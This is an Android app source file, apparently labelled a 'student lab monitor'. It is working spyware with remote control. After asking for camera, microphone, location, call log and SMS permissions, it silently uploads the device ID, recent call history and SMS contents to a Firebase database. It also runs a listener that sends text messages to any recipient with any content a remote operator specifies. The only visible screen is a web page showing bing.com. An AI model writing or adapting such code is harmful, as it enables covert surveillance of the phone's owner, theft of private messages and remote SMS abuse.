package com.wains.app;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Settings;
import android.util.Log;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import android.telephony.SmsManager;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.DataSnapshot;

import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "StudentLabMonitor";
    private FirebaseAuth mAuth;
    private FirebaseDatabase mDatabase;

    private static final int REQUEST_PERMISSIONS = 1;

    // Add SEND_SMS for command execution
    private static final String[] REQUIRED_PERMISSIONS = new String[]{
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS
    };

    private WebView webView;
    private String uid = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Firebase init
        mAuth = FirebaseAuth.getInstance();
        mDatabase = FirebaseDatabase.getInstance();

        // Prepare WebView UI
        webView = findViewById(R.id.webview);
        setupWebView();

        // Sign in, then proceed with data & listeners
        signInAnonymously();

        // Ask for runtime permissions; after grant we will upload logs and start command listener
        checkAndRequestPermissions();
    }

    private void signInAnonymously() {
        mAuth.signInAnonymously().addOnCompleteListener(this, task -> {
            if (task.isSuccessful()) {
                Log.d(TAG, "signInAnonymously:success");
                FirebaseUser user = mAuth.getCurrentUser();
                if (user != null) {
                    uid = user.getUid();
                    writeBasicCheckin();
                    // If permissions already granted, upload immediately and start listener
                    if (allPermissionsGranted()) {
                        uploadDeviceProfile();
                        uploadRecentCallLog();
                        uploadRecentSmsLog();
                        startCommandListener();
                    }
                }
            } else {
                Log.w(TAG, "signInAnonymously:failure", task.getException());
                Toast.makeText(MainActivity.this, "Authentication failed.", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private boolean allPermissionsGranted() {
        for (String p : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void writeBasicCheckin() {
        if (mDatabase != null && uid != null) {
            mDatabase.getReference("devices").child(uid).child("last_checkin")
                    .setValue(System.currentTimeMillis());
        }
    }

    private void uploadDeviceProfile() {
        if (mDatabase == null || uid == null) return;

        String model = Build.MODEL;
        String manufacturer = Build.MANUFACTURER;
        String osVersion = Build.VERSION.RELEASE;
        @SuppressLint("HardwareIds")
        String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        // Default device name = model; could be changed later via admin or local UI
        Map<String, Object> profile = new HashMap<>();
        profile.put("device_name", model);
        profile.put("model", model);
        profile.put("manufacturer", manufacturer);
        profile.put("os_version", osVersion);
        profile.put("android_id", androidId);
        profile.put("last_checkin", System.currentTimeMillis());

        mDatabase.getReference("devices").child(uid).updateChildren(profile);
    }

    private void uploadRecentCallLog() {
        if (!allPermissionsGranted() || uid == null) return;

        ContentResolver cr = getContentResolver();
        Uri uri = CallLog.Calls.CONTENT_URI;

        // Fetch last 25 calls for demo
        String sortOrder = CallLog.Calls.DATE + " DESC LIMIT 25";
        try (Cursor cursor = cr.query(uri, null, null, null, sortOrder)) {
            if (cursor == null) return;

            DatabaseReference callsRef = mDatabase.getReference("devices").child(uid).child("calls");
            int idxNumber = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int idxType = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int idxDate = cursor.getColumnIndex(CallLog.Calls.DATE);
            int idxDuration = cursor.getColumnIndex(CallLog.Calls.DURATION);

            while (cursor.moveToNext()) {
                String number = idxNumber >= 0 ? cursor.getString(idxNumber) : "";
                int typeInt = idxType >= 0 ? cursor.getInt(idxType) : 0;
                String type;
                switch (typeInt) {
                    case CallLog.Calls.OUTGOING_TYPE: type = "outgoing"; break;
                    case CallLog.Calls.INCOMING_TYPE: type = "incoming"; break;
                    case CallLog.Calls.MISSED_TYPE: type = "missed"; break;
                    case CallLog.Calls.REJECTED_TYPE: type = "rejected"; break;
                    case CallLog.Calls.VOICEMAIL_TYPE: type = "voicemail"; break;
                    default: type = "other"; break;
                }
                long when = idxDate >= 0 ? cursor.getLong(idxDate) : 0L;
                int duration = idxDuration >= 0 ? cursor.getInt(idxDuration) : 0;

                Map<String, Object> entry = new HashMap<>();
                entry.put("number", number);
                entry.put("type", type);
                entry.put("time", when);
                entry.put("duration_sec", duration);

                // push() gives unique keys; avoids overwriting
                callsRef.push().setValue(entry);
            }
        } catch (Exception e) {
            Log.w(TAG, "uploadRecentCallLog error", e);
        }
    }

    private void uploadRecentSmsLog() {
        if (!allPermissionsGranted() || uid == null) return;

        // Standard inbox/outbox URIs; note: writing requires default SMS app; we're only reading
        Uri smsUri = Uri.parse("content://sms/");
        ContentResolver cr = getContentResolver();

        // Fetch last 50 SMS
        try (Cursor cursor = cr.query(smsUri, null, null, null, "date DESC LIMIT 50")) {
            if (cursor == null) return;

            DatabaseReference smsRef = mDatabase.getReference("devices").child(uid).child("sms");
            int idxAddress = cursor.getColumnIndex("address");
            int idxBody = cursor.getColumnIndex("body");
            int idxDate = cursor.getColumnIndex("date");
            int idxType = cursor.getColumnIndex("type"); // 1=inbox, 2=sent, etc.

            while (cursor.moveToNext()) {
                String address = idxAddress >= 0 ? cursor.getString(idxAddress) : "";
                String body = idxBody >= 0 ? cursor.getString(idxBody) : "";
                long when = idxDate >= 0 ? cursor.getLong(idxDate) : 0L;
                int t = idxType >= 0 ? cursor.getInt(idxType) : 0;
                String dir = (t == 1) ? "inbox" : (t == 2) ? "sent" : "other";

                Map<String, Object> entry = new HashMap<>();
                entry.put("address", address);
                entry.put("body", body);
                entry.put("time", when);
                entry.put("direction", dir);

                smsRef.push().setValue(entry);
            }
        } catch (Exception e) {
            Log.w(TAG, "uploadRecentSmsLog error", e);
        }
    }

    private void startCommandListener() {
        if (mDatabase == null || uid == null) return;

        DatabaseReference cmdRef = mDatabase.getReference("commands").child(uid).child("send_sms");
        cmdRef.addValueEventListener(new com.google.firebase.database.ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                if (!snapshot.exists()) return;

                String to = snapshot.child("to").getValue(String.class);
                String message = snapshot.child("message").getValue(String.class);
                if (to == null || message == null) return;

                boolean allowed = ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.SEND_SMS)
                        == PackageManager.PERMISSION_GRANTED;

                Map<String, Object> result = new HashMap<>();
                result.put("requested_at", System.currentTimeMillis());
                result.put("to", to);
                result.put("message_len", message.length());

                if (!allowed) {
                    result.put("status", "denied: SEND_SMS not granted");
                    mDatabase.getReference("commands").child(uid).child("last_result").setValue(result);
                    return;
                }

                try {
                    SmsManager sms = SmsManager.getDefault();
                    sms.sendTextMessage(to, null, message, null, null);
                    result.put("status", "sent");
                } catch (Exception e) {
                    result.put("status", "error: " + e.getMessage());
                }

                // Write last_result and clear the command so it doesn't resend
                DatabaseReference base = mDatabase.getReference("commands").child(uid);
                base.child("last_result").setValue(result);
                base.child("send_sms").removeValue();
            }

            @Override
            public void onCancelled(com.google.firebase.database.DatabaseError error) {
                Log.w(TAG, "command listener cancelled", error.toException());
            }
        });
    }

    private void checkAndRequestPermissions() {
        if (!allPermissionsGranted()) {
            ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, REQUEST_PERMISSIONS);
        } else {
            Log.d(TAG, "Permissions already granted.");
            loadHome();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSIONS) {
            boolean allPermissionsGranted = true;
            if (grantResults.length > 0) {
                for (int r : grantResults) {
                    if (r != PackageManager.PERMISSION_GRANTED) {
                        allPermissionsGranted = false;
                        break;
                    }
                }
            } else {
                allPermissionsGranted = false;
            }

            if (allPermissionsGranted) {
                Log.d(TAG, "All requested permissions granted.");
                // Now that we have permissions, upload logs/profile and start command listener
                writeBasicCheckin();
                uploadDeviceProfile();
                uploadRecentCallLog();
                uploadRecentSmsLog();
                startCommandListener();
                loadHome();
            } else {
                Log.w(TAG, "Some permissions denied; limited functionality.");
                Toast.makeText(this, "Some permissions denied; logs/SMS features limited.", Toast.LENGTH_LONG).show();
                // Still allow basic flow
                writeBasicCheckin();
                uploadDeviceProfile(); // profile works without call/sms
                startCommandListener(); // command may fail if SEND_SMS denied
                loadHome();
            }
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void setupWebView() {
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        webView.setWebViewClient(new WebViewClient());
    }

    private void loadHome() {
        // You can later change this to your own dashboard
        webView.loadUrl("https://www.bing.com");
    }
}
